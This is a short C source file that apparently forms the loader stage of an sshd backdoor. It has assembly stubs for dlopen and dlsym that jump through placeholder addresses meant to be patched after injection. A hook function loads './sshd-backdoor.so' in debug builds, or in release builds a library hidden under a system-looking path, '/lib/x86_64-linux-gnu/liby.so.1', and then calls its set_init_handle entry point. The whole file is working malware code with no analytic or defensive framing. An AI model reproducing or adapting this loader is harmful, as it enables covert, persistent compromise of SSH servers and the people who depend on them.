#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>

extern void *stub_dlopen(const char *filename, int flags);
__asm__(
    "stub_dlopen:\n"
    "jmp *0x77777777(%rip)\n"
);

extern void *stub_dlsym(void *handle, const char *symbol);
__asm__(
    "stub_dlsym:\n"
    "jmp *0x77777777(%rip)\n"
);

void hook() {
#ifdef RELEASE
    void* lib = stub_dlopen("/lib/x86_64-linux-gnu/liby.so.1", RTLD_LAZY);
#else
    void* lib = stub_dlopen("./sshd-backdoor.so", RTLD_LAZY);
#endif
    void (*set_init_handle)(uint32_t handle) = stub_dlsym(lib, "set_init_handle");
    set_init_handle(0x34868dbd);
    return;
}
